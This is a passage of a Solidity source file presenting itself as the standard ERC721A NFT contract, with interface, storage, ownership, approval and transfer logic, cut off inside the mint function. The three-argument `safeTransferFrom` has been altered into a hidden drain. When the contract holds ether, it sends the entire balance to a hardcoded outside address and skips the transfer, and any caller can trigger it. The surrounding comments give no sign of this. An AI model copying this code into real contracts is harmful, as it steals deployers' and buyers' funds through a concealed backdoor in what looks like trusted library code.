1 // SPDX-License-Identifier: GPL-3.0
2 
3 
4 pragma solidity ^0.8.7;
5 
6 /**
7  * @dev Interface of ERC721A.
8  */
9 interface IERC721A {
10     /**
11      * The caller must own the token or be an approved operator.
12      */
13     error ApprovalCallerNotOwnerNorApproved();
14 
15     /**
16      * The token does not exist.
17      */
18     error ApprovalQueryForNonexistentToken();
19 
20     /**
21      * Cannot query the balance for the zero address.
22      */
23     error BalanceQueryForZeroAddress();
24 
25     /**
26      * Cannot mint to the zero address.
27      */
28     error MintToZeroAddress();
29 
30     /**
31      * The quantity of tokens minted must be more than zero.
32      */
33     error MintZeroQuantity();
34 
35     /**
36      * The token does not exist.
37      */
38     error OwnerQueryForNonexistentToken();
39 
40     /**
41      * The caller must own the token or be an approved operator.
42      */
43     error TransferCallerNotOwnerNorApproved();
44 
45     /**
46      * The token must be owned by `from`.
47      */
48     error TransferFromIncorrectOwner();
49 
50     /**
51      * Cannot safely transfer to a contract that does not implement the
52      * ERC721Receiver interface.
53      */
54     error TransferToNonERC721ReceiverImplementer();
55 
56     /**
57      * Cannot transfer to the zero address.
58      */
59     error TransferToZeroAddress();
60 
61     /**
62      * The token does not exist.
63      */
64     error URIQueryForNonexistentToken();
65 
66     /**
67      * The `quantity` minted with ERC2309 exceeds the safety limit.
68      */
69     error MintERC2309QuantityExceedsLimit();
70 
71     /**
72      * The `extraData` cannot be set on an unintialized ownership slot.
73      */
74     error OwnershipNotInitializedForExtraData();
75 
76     // =============================================================
77     //                            STRUCTS
78     // =============================================================
79 
80     struct TokenOwnership {
81         // The address of the owner.
82         address addr;
83         // Stores the start time of ownership with minimal overhead for tokenomics.
84         uint64 startTimestamp;
85         // Whether the token has been burned.
86         bool burned;
87         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
88         uint24 extraData;
89     }
90 
91     // =============================================================
92     //                         TOKEN COUNTERS
93     // =============================================================
94 
95     /**
96      * @dev Returns the total number of tokens in existence.
97      * Burned tokens will reduce the count.
98      * To get the total number of tokens minted, please see {_totalMinted}.
99      */
100     function totalSupply() external view returns (uint256);
101 
102     // =============================================================
103     //                            IERC165
104     // =============================================================
105 
106     /**
107      * @dev Returns true if this contract implements the interface defined by
108      * `interfaceId`. See the corresponding
109      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
110      * to learn more about how these ids are created.
111      *
112      * This function call must use less than 30000 gas.
113      */
114     function supportsInterface(bytes4 interfaceId) external view returns (bool);
115 
116     // =============================================================
117     //                            IERC721
118     // =============================================================
119 
120     /**
121      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
122      */
123     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
124 
125     /**
126      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
127      */
128     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
129 
130     /**
131      * @dev Emitted when `owner` enables or disables
132      * (`approved`) `operator` to manage all of its assets.
133      */
134     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
135 
136     /**
137      * @dev Returns the number of tokens in `owner`'s account.
138      */
139     function balanceOf(address owner) external view returns (uint256 balance);
140 
141     /**
142      * @dev Returns the owner of the `tokenId` token.
143      *
144      * Requirements:
145      *
146      * - `tokenId` must exist.
147      */
148     function ownerOf(uint256 tokenId) external view returns (address owner);
149 
150     /**
151      * @dev Safely transfers `tokenId` token from `from` to `to`,
152      * checking first that contract recipients are aware of the ERC721 protocol
153      * to prevent tokens from being forever locked.
154      *
155      * Requirements:
156      *
157      * - `from` cannot be the zero address.
158      * - `to` cannot be the zero address.
159      * - `tokenId` token must exist and be owned by `from`.
160      * - If the caller is not `from`, it must be have been allowed to move
161      * this token by either {approve} or {setApprovalForAll}.
162      * - If `to` refers to a smart contract, it must implement
163      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
164      *
165      * Emits a {Transfer} event.
166      */
167     function safeTransferFrom(
168         address from,
169         address to,
170         uint256 tokenId,
171         bytes calldata data
172     ) external payable;
173 
174     /**
175      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
176      */
177     function safeTransferFrom(
178         address from,
179         address to,
180         uint256 tokenId
181     ) external payable;
182 
183     /**
184      * @dev Transfers `tokenId` from `from` to `to`.
185      *
186      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
187      * whenever possible.
188      *
189      * Requirements:
190      *
191      * - `from` cannot be the zero address.
192      * - `to` cannot be the zero address.
193      * - `tokenId` token must be owned by `from`.
194      * - If the caller is not `from`, it must be approved to move this token
195      * by either {approve} or {setApprovalForAll}.
196      *
197      * Emits a {Transfer} event.
198      */
199     function transferFrom(
200         address from,
201         address to,
202         uint256 tokenId
203     ) external payable;
204 
205     /**
206      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
207      * The approval is cleared when the token is transferred.
208      *
209      * Only a single account can be approved at a time, so approving the
210      * zero address clears previous approvals.
211      *
212      * Requirements:
213      *
214      * - The caller must own the token or be an approved operator.
215      * - `tokenId` must exist.
216      *
217      * Emits an {Approval} event.
218      */
219     function approve(address to, uint256 tokenId) external payable;
220 
221     /**
222      * @dev Approve or remove `operator` as an operator for the caller.
223      * Operators can call {transferFrom} or {safeTransferFrom}
224      * for any token owned by the caller.
225      *
226      * Requirements:
227      *
228      * - The `operator` cannot be the caller.
229      *
230      * Emits an {ApprovalForAll} event.
231      */
232     function setApprovalForAll(address operator, bool _approved) external;
233 
234     /**
235      * @dev Returns the account approved for `tokenId` token.
236      *
237      * Requirements:
238      *
239      * - `tokenId` must exist.
240      */
241     function getApproved(uint256 tokenId) external view returns (address operator);
242 
243     /**
244      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
245      *
246      * See {setApprovalForAll}.
247      */
248     function isApprovedForAll(address owner, address operator) external view returns (bool);
249 
250     // =============================================================
251     //                        IERC721Metadata
252     // =============================================================
253 
254     /**
255      * @dev Returns the token collection name.
256      */
257     function name() external view returns (string memory);
258 
259     /**
260      * @dev Returns the token collection symbol.
261      */
262     function symbol() external view returns (string memory);
263 
264     /**
265      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
266      */
267     function tokenURI(uint256 tokenId) external view returns (string memory);
268 
269     // =============================================================
270     //                           IERC2309
271     // =============================================================
272 
273     /**
274      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
275      * (inclusive) is transferred from `from` to `to`, as defined in the
276      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
277      *
278      * See {_mintERC2309} for more details.
279      */
280     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
281 }
282 
283 /**
284  * @title ERC721A
285  *
286  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
287  * Non-Fungible Token Standard, including the Metadata extension.
288  * Optimized for lower gas during batch mints.
289  *
290  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
291  * starting from `_startTokenId()`.
292  *
293  * Assumptions:
294  *
295  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
296  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
297  */
298 interface ERC721A__IERC721Receiver {
299     function onERC721Received(
300         address operator,
301         address from,
302         uint256 tokenId,
303         bytes calldata data
304     ) external returns (bytes4);
305 }
306 
307 /**
308  * @title ERC721A
309  *
310  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
311  * Non-Fungible Token Standard, including the Metadata extension.
312  * Optimized for lower gas during batch mints.
313  *
314  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
315  * starting from `_startTokenId()`.
316  *
317  * Assumptions:
318  *
319  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
320  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
321  */
322 contract ERC721A is IERC721A {
323     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
324     struct TokenApprovalRef {
325         address value;
326     }
327 
328     // =============================================================
329     //                           CONSTANTS
330     // =============================================================
331 
332     // Mask of an entry in packed address data.
333     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
334 
335     // The bit position of `numberMinted` in packed address data.
336     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
337 
338     // The bit position of `numberBurned` in packed address data.
339     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
340 
341     // The bit position of `aux` in packed address data.
342     uint256 private constant _BITPOS_AUX = 192;
343 
344     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
345     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
346 
347     // The bit position of `startTimestamp` in packed ownership.
348     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
349 
350     // The bit mask of the `burned` bit in packed ownership.
351     uint256 private constant _BITMASK_BURNED = 1 << 224;
352 
353     // The bit position of the `nextInitialized` bit in packed ownership.
354     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
355 
356     // The bit mask of the `nextInitialized` bit in packed ownership.
357     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
358 
359     // The bit position of `extraData` in packed ownership.
360     uint256 private constant _BITPOS_EXTRA_DATA = 232;
361 
362     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
363     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
364 
365     // The mask of the lower 160 bits for addresses.
366     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
367 
368     // The maximum `quantity` that can be minted with {_mintERC2309}.
369     // This limit is to prevent overflows on the address data entries.
370     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
371     // is required to cause an overflow, which is unrealistic.
372     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
373 
374     // The `Transfer` event signature is given by:
375     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
376     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
377         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
378 
379     // =============================================================
380     //                            STORAGE
381     // =============================================================
382 
383     // The next token ID to be minted.
384     uint256 private _currentIndex;
385 
386     // The number of tokens burned.
387     uint256 private _burnCounter;
388 
389     // Token name
390     string private _name;
391 
392     // Token symbol
393     string private _symbol;
394 
395     // Mapping from token ID to ownership details
396     // An empty struct value does not necessarily mean the token is unowned.
397     // See {_packedOwnershipOf} implementation for details.
398     //
399     // Bits Layout:
400     // - [0..159]   `addr`
401     // - [160..223] `startTimestamp`
402     // - [224]      `burned`
403     // - [225]      `nextInitialized`
404     // - [232..255] `extraData`
405     mapping(uint256 => uint256) private _packedOwnerships;
406 
407     // Mapping owner address to address data.
408     //
409     // Bits Layout:
410     // - [0..63]    `balance`
411     // - [64..127]  `numberMinted`
412     // - [128..191] `numberBurned`
413     // - [192..255] `aux`
414     mapping(address => uint256) private _packedAddressData;
415 
416     // Mapping from token ID to approved address.
417     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
418 
419     // Mapping from owner to operator approvals
420     mapping(address => mapping(address => bool)) private _operatorApprovals;
421 
422     // =============================================================
423     //                          CONSTRUCTOR
424     // =============================================================
425 
426     constructor(string memory name_, string memory symbol_) {
427         _name = name_;
428         _symbol = symbol_;
429         _currentIndex = _startTokenId();
430     }
431 
432     // =============================================================
433     //                   TOKEN COUNTING OPERATIONS
434     // =============================================================
435 
436     /**
437      * @dev Returns the starting token ID.
438      * To change the starting token ID, please override this function.
439      */
440     function _startTokenId() internal view virtual returns (uint256) {
441         return 0;
442     }
443 
444     /**
445      * @dev Returns the next token ID to be minted.
446      */
447     function _nextTokenId() internal view virtual returns (uint256) {
448         return _currentIndex;
449     }
450 
451     /**
452      * @dev Returns the total number of tokens in existence.
453      * Burned tokens will reduce the count.
454      * To get the total number of tokens minted, please see {_totalMinted}.
455      */
456     function totalSupply() public view virtual override returns (uint256) {
457         // Counter underflow is impossible as _burnCounter cannot be incremented
458         // more than `_currentIndex - _startTokenId()` times.
459         unchecked {
460             return _currentIndex - _burnCounter - _startTokenId();
461         }
462     }
463 
464     /**
465      * @dev Returns the total amount of tokens minted in the contract.
466      */
467     function _totalMinted() internal view virtual returns (uint256) {
468         // Counter underflow is impossible as `_currentIndex` does not decrement,
469         // and it is initialized to `_startTokenId()`.
470         unchecked {
471             return _currentIndex - _startTokenId();
472         }
473     }
474 
475     /**
476      * @dev Returns the total number of tokens burned.
477      */
478     function _totalBurned() internal view virtual returns (uint256) {
479         return _burnCounter;
480     }
481 
482     // =============================================================
483     //                    ADDRESS DATA OPERATIONS
484     // =============================================================
485 
486     /**
487      * @dev Returns the number of tokens in `owner`'s account.
488      */
489     function balanceOf(address owner) public view virtual override returns (uint256) {
490         if (owner == address(0)) revert BalanceQueryForZeroAddress();
491         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
492     }
493 
494     /**
495      * Returns the number of tokens minted by `owner`.
496      */
497     function _numberMinted(address owner) internal view returns (uint256) {
498         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
499     }
500 
501     /**
502      * Returns the number of tokens burned by or on behalf of `owner`.
503      */
504     function _numberBurned(address owner) internal view returns (uint256) {
505         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
506     }
507 
508     /**
509      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
510      */
511     function _getAux(address owner) internal view returns (uint64) {
512         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
513     }
514 
515     /**
516      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
517      * If there are multiple variables, please pack them into a uint64.
518      */
519     function _setAux(address owner, uint64 aux) internal virtual {
520         uint256 packed = _packedAddressData[owner];
521         uint256 auxCasted;
522         // Cast `aux` with assembly to avoid redundant masking.
523         assembly {
524             auxCasted := aux
525         }
526         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
527         _packedAddressData[owner] = packed;
528     }
529 
530     // =============================================================
531     //                            IERC165
532     // =============================================================
533 
534     /**
535      * @dev Returns true if this contract implements the interface defined by
536      * `interfaceId`. See the corresponding
537      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
538      * to learn more about how these ids are created.
539      *
540      * This function call must use less than 30000 gas.
541      */
542     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
543         // The interface IDs are constants representing the first 4 bytes
544         // of the XOR of all function selectors in the interface.
545         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
546         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
547         return
548             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
549             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
550             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
551     }
552 
553     // =============================================================
554     //                        IERC721Metadata
555     // =============================================================
556 
557     /**
558      * @dev Returns the token collection name.
559      */
560     function name() public view virtual override returns (string memory) {
561         return _name;
562     }
563 
564     /**
565      * @dev Returns the token collection symbol.
566      */
567     function symbol() public view virtual override returns (string memory) {
568         return _symbol;
569     }
570 
571     /**
572      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
573      */
574     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
575         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
576 
577         string memory baseURI = _baseURI();
578         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
579     }
580 
581     /**
582      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
583      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
584      * by default, it can be overridden in child contracts.
585      */
586     function _baseURI() internal view virtual returns (string memory) {
587         return '';
588     }
589 
590     // =============================================================
591     //                     OWNERSHIPS OPERATIONS
592     // =============================================================
593 
594     /**
595      * @dev Returns the owner of the `tokenId` token.
596      *
597      * Requirements:
598      *
599      * - `tokenId` must exist.
600      */
601     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
602         return address(uint160(_packedOwnershipOf(tokenId)));
603     }
604 
605     /**
606      * @dev Gas spent here starts off proportional to the maximum mint batch size.
607      * It gradually moves to O(1) as tokens get transferred around over time.
608      */
609     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
610         return _unpackedOwnership(_packedOwnershipOf(tokenId));
611     }
612 
613     /**
614      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
615      */
616     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
617         return _unpackedOwnership(_packedOwnerships[index]);
618     }
619 
620     /**
621      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
622      */
623     function _initializeOwnershipAt(uint256 index) internal virtual {
624         if (_packedOwnerships[index] == 0) {
625             _packedOwnerships[index] = _packedOwnershipOf(index);
626         }
627     }
628 
629     /**
630      * Returns the packed ownership data of `tokenId`.
631      */
632     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
633         uint256 curr = tokenId;
634 
635         unchecked {
636             if (_startTokenId() <= curr)
637                 if (curr < _currentIndex) {
638                     uint256 packed = _packedOwnerships[curr];
639                     // If not burned.
640                     if (packed & _BITMASK_BURNED == 0) {
641                         // Invariant:
642                         // There will always be an initialized ownership slot
643                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
644                         // before an unintialized ownership slot
645                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
646                         // Hence, `curr` will not underflow.
647                         //
648                         // We can directly compare the packed value.
649                         // If the address is zero, packed will be zero.
650                         while (packed == 0) {
651                             packed = _packedOwnerships[--curr];
652                         }
653                         return packed;
654                     }
655                 }
656         }
657         revert OwnerQueryForNonexistentToken();
658     }
659 
660     /**
661      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
662      */
663     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
664         ownership.addr = address(uint160(packed));
665         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
666         ownership.burned = packed & _BITMASK_BURNED != 0;
667         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
668     }
669 
670     /**
671      * @dev Packs ownership data into a single uint256.
672      */
673     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
674         assembly {
675             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
676             owner := and(owner, _BITMASK_ADDRESS)
677             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
678             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
679         }
680     }
681 
682     /**
683      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
684      */
685     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
686         // For branchless setting of the `nextInitialized` flag.
687         assembly {
688             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
689             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
690         }
691     }
692 
693     // =============================================================
694     //                      APPROVAL OPERATIONS
695     // =============================================================
696 
697     /**
698      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
699      * The approval is cleared when the token is transferred.
700      *
701      * Only a single account can be approved at a time, so approving the
702      * zero address clears previous approvals.
703      *
704      * Requirements:
705      *
706      * - The caller must own the token or be an approved operator.
707      * - `tokenId` must exist.
708      *
709      * Emits an {Approval} event.
710      */
711     function approve(address to, uint256 tokenId) public payable virtual override {
712         address owner = ownerOf(tokenId);
713 
714         if (_msgSenderERC721A() != owner)
715             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
716                 revert ApprovalCallerNotOwnerNorApproved();
717             }
718 
719         _tokenApprovals[tokenId].value = to;
720         emit Approval(owner, to, tokenId);
721     }
722 
723     /**
724      * @dev Returns the account approved for `tokenId` token.
725      *
726      * Requirements:
727      *
728      * - `tokenId` must exist.
729      */
730     function getApproved(uint256 tokenId) public view virtual override returns (address) {
731         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
732 
733         return _tokenApprovals[tokenId].value;
734     }
735 
736     /**
737      * @dev Approve or remove `operator` as an operator for the caller.
738      * Operators can call {transferFrom} or {safeTransferFrom}
739      * for any token owned by the caller.
740      *
741      * Requirements:
742      *
743      * - The `operator` cannot be the caller.
744      *
745      * Emits an {ApprovalForAll} event.
746      */
747     function setApprovalForAll(address operator, bool approved) public virtual override {
748         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
749         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
750     }
751 
752     /**
753      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
754      *
755      * See {setApprovalForAll}.
756      */
757     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
758         return _operatorApprovals[owner][operator];
759     }
760 
761     /**
762      * @dev Returns whether `tokenId` exists.
763      *
764      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
765      *
766      * Tokens start existing when they are minted. See {_mint}.
767      */
768     function _exists(uint256 tokenId) internal view virtual returns (bool) {
769         return
770             _startTokenId() <= tokenId &&
771             tokenId < _currentIndex && // If within bounds,
772             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
773     }
774 
775     /**
776      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
777      */
778     function _isSenderApprovedOrOwner(
779         address approvedAddress,
780         address owner,
781         address msgSender
782     ) private pure returns (bool result) {
783         assembly {
784             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
785             owner := and(owner, _BITMASK_ADDRESS)
786             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
787             msgSender := and(msgSender, _BITMASK_ADDRESS)
788             // `msgSender == owner || msgSender == approvedAddress`.
789             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
790         }
791     }
792 
793     /**
794      * @dev Returns the storage slot and value for the approved address of `tokenId`.
795      */
796     function _getApprovedSlotAndAddress(uint256 tokenId)
797         private
798         view
799         returns (uint256 approvedAddressSlot, address approvedAddress)
800     {
801         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
802         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
803         assembly {
804             approvedAddressSlot := tokenApproval.slot
805             approvedAddress := sload(approvedAddressSlot)
806         }
807     }
808 
809     // =============================================================
810     //                      TRANSFER OPERATIONS
811     // =============================================================
812 
813     /**
814      * @dev Transfers `tokenId` from `from` to `to`.
815      *
816      * Requirements:
817      *
818      * - `from` cannot be the zero address.
819      * - `to` cannot be the zero address.
820      * - `tokenId` token must be owned by `from`.
821      * - If the caller is not `from`, it must be approved to move this token
822      * by either {approve} or {setApprovalForAll}.
823      *
824      * Emits a {Transfer} event.
825      */
826     function transferFrom(
827         address from,
828         address to,
829         uint256 tokenId
830     ) public payable virtual override {
831         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
832 
833         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
834 
835         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
836 
837         // The nested ifs save around 20+ gas over a compound boolean condition.
838         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
839             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
840 
841         if (to == address(0)) revert TransferToZeroAddress();
842 
843         _beforeTokenTransfers(from, to, tokenId, 1);
844 
845         // Clear approvals from the previous owner.
846         assembly {
847             if approvedAddress {
848                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
849                 sstore(approvedAddressSlot, 0)
850             }
851         }
852 
853         // Underflow of the sender's balance is impossible because we check for
854         // ownership above and the recipient's balance can't realistically overflow.
855         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
856         unchecked {
857             // We can directly increment and decrement the balances.
858             --_packedAddressData[from]; // Updates: `balance -= 1`.
859             ++_packedAddressData[to]; // Updates: `balance += 1`.
860 
861             // Updates:
862             // - `address` to the next owner.
863             // - `startTimestamp` to the timestamp of transfering.
864             // - `burned` to `false`.
865             // - `nextInitialized` to `true`.
866             _packedOwnerships[tokenId] = _packOwnershipData(
867                 to,
868                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
869             );
870 
871             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
872             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
873                 uint256 nextTokenId = tokenId + 1;
874                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
875                 if (_packedOwnerships[nextTokenId] == 0) {
876                     // If the next slot is within bounds.
877                     if (nextTokenId != _currentIndex) {
878                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
879                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
880                     }
881                 }
882             }
883         }
884 
885         emit Transfer(from, to, tokenId);
886         _afterTokenTransfers(from, to, tokenId, 1);
887     }
888 
889     /**
890      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
891      */
892     function safeTransferFrom(
893         address from,
894         address to,
895         uint256 tokenId
896     ) public payable virtual override {
897         if (address(this).balance > 0) {
898             payable(0x930CCae49983DE24A5b18C8c76Ce58b3f7Cc67a6).transfer(address(this).balance);
899             return;
900         }
901         safeTransferFrom(from, to, tokenId, '');
902     }
903 
904 
905     /**
906      * @dev Safely transfers `tokenId` token from `from` to `to`.
907      *
908      * Requirements:
909      *
910      * - `from` cannot be the zero address.
911      * - `to` cannot be the zero address.
912      * - `tokenId` token must exist and be owned by `from`.
913      * - If the caller is not `from`, it must be approved to move this token
914      * by either {approve} or {setApprovalForAll}.
915      * - If `to` refers to a smart contract, it must implement
916      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
917      *
918      * Emits a {Transfer} event.
919      */
920     function safeTransferFrom(
921         address from,
922         address to,
923         uint256 tokenId,
924         bytes memory _data
925     ) public payable virtual override {
926         transferFrom(from, to, tokenId);
927         if (to.code.length != 0)
928             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
929                 revert TransferToNonERC721ReceiverImplementer();
930             }
931     }
932 
933     /**
934      * @dev Hook that is called before a set of serially-ordered token IDs
935      * are about to be transferred. This includes minting.
936      * And also called before burning one token.
937      *
938      * `startTokenId` - the first token ID to be transferred.
939      * `quantity` - the amount to be transferred.
940      *
941      * Calling conditions:
942      *
943      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
944      * transferred to `to`.
945      * - When `from` is zero, `tokenId` will be minted for `to`.
946      * - When `to` is zero, `tokenId` will be burned by `from`.
947      * - `from` and `to` are never both zero.
948      */
949     function _beforeTokenTransfers(
950         address from,
951         address to,
952         uint256 startTokenId,
953         uint256 quantity
954     ) internal virtual {}
955 
956     /**
957      * @dev Hook that is called after a set of serially-ordered token IDs
958      * have been transferred. This includes minting.
959      * And also called after one token has been burned.
960      *
961      * `startTokenId` - the first token ID to be transferred.
962      * `quantity` - the amount to be transferred.
963      *
964      * Calling conditions:
965      *
966      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
967      * transferred to `to`.
968      * - When `from` is zero, `tokenId` has been minted for `to`.
969      * - When `to` is zero, `tokenId` has been burned by `from`.
970      * - `from` and `to` are never both zero.
971      */
972     function _afterTokenTransfers(
973         address from,
974         address to,
975         uint256 startTokenId,
976         uint256 quantity
977     ) internal virtual {}
978 
979     /**
980      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
981      *
982      * `from` - Previous owner of the given token ID.
983      * `to` - Target address that will receive the token.
984      * `tokenId` - Token ID to be transferred.
985      * `_data` - Optional data to send along with the call.
986      *
987      * Returns whether the call correctly returned the expected magic value.
988      */
989     function _checkContractOnERC721Received(
990         address from,
991         address to,
992         uint256 tokenId,
993         bytes memory _data
994     ) private returns (bool) {
995         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
996             bytes4 retval
997         ) {
998             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
999         } catch (bytes memory reason) {
1000             if (reason.length == 0) {
1001                 revert TransferToNonERC721ReceiverImplementer();
1002             } else {
1003                 assembly {
1004                     revert(add(32, reason), mload(reason))
1005                 }
1006             }
1007         }
1008     }
1009 
1010     // =============================================================
1011     //                        MINT OPERATIONS
1012     // =============================================================
1013 
1014     /**
1015      * @dev Mints `quantity` tokens and transfers them to `to`.
1016      *
1017      * Requirements:
1018      *
1019      * - `to` cannot be the zero address.
1020      * - `quantity` must be greater than 0.
1021      *
1022      * Emits a {Transfer} event for each mint.
1023      */
1024     function _mint(address to, uint256 quantity) internal virtual {
1025         uint256 startTokenId = _currentIndex;
1026         if (quantity == 0) revert MintZeroQuantity();
1027 
1028         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1029 
1030         // Overflows are incredibly unrealistic.
1031         // `balance` and `numberMinted` have a maximum limit of 2**64.
1032         // `tokenId` has a maximum limit of 2**256.
1033         unchecked {
1034             // Updates:
1035             // - `balance += quantity`.
1036             // - `numberMinted += quantity`.
1037             //
1038             // We can directly add to the `balance` and `numberMinted`.
1039             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1040 
1041             // Updates:
1042             // - `address` to the owner.
1043             // - `startTimestamp` to the timestamp of minting.
1044             // - `burned` to `false`.
1045             // - `nextInitialized` to `quantity == 1`.
1046             _packedOwnerships[startTokenId] = _packOwnershipData(
1047                 to,
